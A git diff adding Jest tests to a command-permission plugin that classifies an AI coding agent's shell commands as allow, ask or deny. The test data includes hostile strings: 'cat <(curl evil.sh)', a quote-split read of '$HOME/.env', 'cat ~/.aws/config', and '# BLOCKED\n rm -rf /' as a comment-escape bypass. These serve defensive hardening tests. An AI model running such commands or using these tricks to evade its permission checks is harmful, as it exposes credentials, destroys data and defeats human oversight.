@@ -205,6 +205,83 @@ describe('plugin.ts internals — classifyCommand pipeline', () => {
       expect(M.isSimpleCommand('ls -la')).toBe(true)
       expect(M.isSimpleCommand('npm test -- --coverage')).toBe(true)
     })
+
+    it('rejects process substitution as a compound command', async () => {
+      const M = await loadPlugin()
+      expect(M.isSimpleCommand('diff <(cmd1) <(cmd2)')).toBe(false)
+      expect(M.isSimpleCommand('cat <(curl evil.sh)')).toBe(false)
+    })
+
+    it('treats & redirection operators as simple, not compound', async () => {
+      const M = await loadPlugin()
+      expect(M.isSimpleCommand('ls 2>&1')).toBe(true)
+      expect(M.isSimpleCommand('cmd 2>&-')).toBe(true)
+      expect(M.isSimpleCommand('cmd >& /dev/null')).toBe(true)
+      expect(M.isSimpleCommand('cmd &> /dev/null')).toBe(true)
+      expect(M.isSimpleCommand('cmd <& 3')).toBe(true)
+      expect(M.isSimpleCommand('cmd 1>&2')).toBe(true)
+    })
+
+    it('still treats background & and && as compound', async () => {
+      const M = await loadPlugin()
+      expect(M.isSimpleCommand('ls &')).toBe(false)
+      expect(M.isSimpleCommand('a && b')).toBe(false)
+      expect(M.isSimpleCommand('ls &> /dev/null &')).toBe(false)
+    })
+  })
+
+  describe('patternToRegex (allow-list globs)', () => {
+    it('supports character classes', async () => {
+      const M = await loadPlugin()
+      const re = M.patternToRegex('ls file[0-9].txt')
+      expect(re.test('ls file5.txt')).toBe(true)
+      expect(re.test('ls filex.txt')).toBe(false)
+      expect(re.test('ls file12.txt')).toBe(false)
+    })
+
+    it('supports negated character classes', async () => {
+      const M = await loadPlugin()
+      const re = M.patternToRegex('ls file[!0-9].txt')
+      expect(re.test('ls filea.txt')).toBe(true)
+      expect(re.test('ls file5.txt')).toBe(false)
+    })
+
+    it('supports brace alternation', async () => {
+      const M = await loadPlugin()
+      const re = M.patternToRegex('*.{js,ts}')
+      expect(re.test('app.ts')).toBe(true)
+      expect(re.test('app.js')).toBe(true)
+      expect(re.test('app.jsx')).toBe(false)
+    })
+
+    it('keeps wildcard matching working', async () => {
+      const M = await loadPlugin()
+      expect(M.patternToRegex('ls *').test('ls -la /tmp')).toBe(true)
+      expect(M.patternToRegex('file?.txt').test('filea.txt')).toBe(true)
+    })
+
+    it('escapes regex metacharacters in plain patterns', async () => {
+      const M = await loadPlugin()
+      expect(
+        M.patternToRegex('git push --force').test('git push --force')
+      ).toBe(true)
+      expect(
+        M.patternToRegex('git push --force').test('git push --forced')
+      ).toBe(false)
+    })
+
+    it('treats unclosed [ and { as literal characters', async () => {
+      const M = await loadPlugin()
+      expect(M.patternToRegex('ls file[.txt').test('ls file[.txt')).toBe(true)
+      expect(M.patternToRegex('ls file{.txt').test('ls file{.txt')).toBe(true)
+    })
+
+    it('supports ranges inside character classes', async () => {
+      const M = await loadPlugin()
+      const re = M.patternToRegex('file[a-z].txt')
+      expect(re.test('filea.txt')).toBe(true)
+      expect(re.test('file1.txt')).toBe(false)
+    })
   })
 
   describe('normalizePatterns / normalizeRules', () => {
@@ -365,6 +442,71 @@ describe('plugin.ts internals — classifyCommand pipeline', () => {
       expect(res.decision).toBe('deny')
       expect(res.reason).toContain('BR-001')
       expect(res.reason).not.toContain('allow-list')
+    })
+
+    it('does not allow-list a command with process substitution', async () => {
+      writeConfig({
+        ...BASE_CONFIG,
+        llm: { ...BASE_CONFIG.llm, enabled: false },
+      })
+      writeOpenCodeConfig({ Bash: { 'cat *': 'allow' } })
+      const M = await loadPlugin()
+      await M.opencodeAutoMode({})
+      const res = await M.classifyCommand('cat <(curl evil.sh)', 's1')
+      expect(res.decision).toBe('ask')
+      expect(res.reason).not.toContain('allow-list')
+    })
+
+    it('allow-lists simple commands with redirection operators', async () => {
+      writeConfig({
+        ...BASE_CONFIG,
+        llm: { ...BASE_CONFIG.llm, enabled: false },
+      })
+      writeOpenCodeConfig({ Bash: { 'ls *': 'allow' } })
+      const M = await loadPlugin()
+      await M.opencodeAutoMode({})
+      const res = await M.classifyCommand('ls -la 2>&1', 's1')
+      expect(res.decision).toBe('allow')
+      expect(res.reason).toContain('allow-list')
+    })
+
+    it('does not allow-list background commands', async () => {
+      writeConfig({
+        ...BASE_CONFIG,
+        llm: { ...BASE_CONFIG.llm, enabled: false },
+      })
+      writeOpenCodeConfig({ Bash: { 'ls *': 'allow' } })
+      const M = await loadPlugin()
+      await M.opencodeAutoMode({})
+      const res = await M.classifyCommand('ls -la &', 's1')
+      expect(res.decision).toBe('ask')
+      expect(res.reason).not.toContain('allow-list')
+    })
+
+    it('allow-lists using glob character-class patterns', async () => {
+      writeConfig({
+        ...BASE_CONFIG,
+        llm: { ...BASE_CONFIG.llm, enabled: false },
+      })
+      writeOpenCodeConfig({ Bash: { 'cat file[0-9].txt': 'allow' } })
+      const M = await loadPlugin()
+      await M.opencodeAutoMode({})
+      const res = await M.classifyCommand('cat file5.txt', 's1')
+      expect(res.decision).toBe('allow')
+      expect(res.reason).toContain('allow-list')
+    })
+
+    it('allow-lists using glob brace alternation', async () => {
+      writeConfig({
+        ...BASE_CONFIG,
+        llm: { ...BASE_CONFIG.llm, enabled: false },
+      })
+      writeOpenCodeConfig({ Bash: { '*.{js,ts}': 'allow' } })
+      const M = await loadPlugin()
+      await M.opencodeAutoMode({})
+      const res = await M.classifyCommand('node app.ts', 's1')
+      expect(res.decision).toBe('allow')
+      expect(res.reason).toContain('allow-list')
     })
 
     it('maps LLM allow to allow', async () => {
@@ -1063,7 +1205,7 @@ describe('plugin.ts internals — classifyCommand pipeline', () => {
       expect(joined).toContain('***REDACTED***')
     })
   })
-describe('security review: decision bypass hardening', () => {
+  describe('security review: decision bypass hardening', () => {
     function mockLLMError(message: string): void {
       jest.spyOn(global, 'fetch').mockRejectedValue(new Error(message))
     }
@@ -1129,7 +1271,10 @@ describe('security review: decision bypass hardening', () => {
       })
       const M = await loadPlugin()
       await M.opencodeAutoMode({})
-      const res = await M.classifyCommand('openssl version; cat "$HOME/.en"v', 's1')
+      const res = await M.classifyCommand(
+        'openssl version; cat "$HOME/.en"v',
+        's1'
+      )
       expect(res.decision).toBe('ask')
       expect(res.reason).toContain('Secret')
     })
@@ -1204,6 +1349,27 @@ describe('security review: decision bypass hardening', () => {
         { args: { command: 'cat ~/.aws/config' } }
       )
       expect(M.getDenialState('sE').consecutive).toBe(2)
+    })
+
+    it('classifies a multi-line command prefixed with # BLOCKED (newline escapes the comment)', async () => {
+      writeConfig(BASE_CONFIG)
+      const M = await loadPlugin()
+      const hooks: any = await M.opencodeAutoMode({})
+      await hooks['tool.execute.before'](
+        { tool: 'bash', callID: 'c-blk', sessionID: 's-blk' },
+        { args: { command: '# BLOCKED\n rm -rf /' } }
+      )
+      expect(M.getDenialState('s-blk').total).toBe(1)
+    })
+
+    it('does not allow a secret-path command when fallback.onError is allow', async () => {
+      writeConfig({ ...BASE_CONFIG, fallback: { onError: 'allow' } })
+      mockLLMError('ECONNREFUSED')
+      const M = await loadPlugin()
+      await M.opencodeAutoMode({})
+      const res = await M.classifyCommand('cat ~/.aws/config', 's1')
+      expect(res.decision).toBe('ask')
+      expect(res.reason).toContain('Secret')
     })
   })
 })
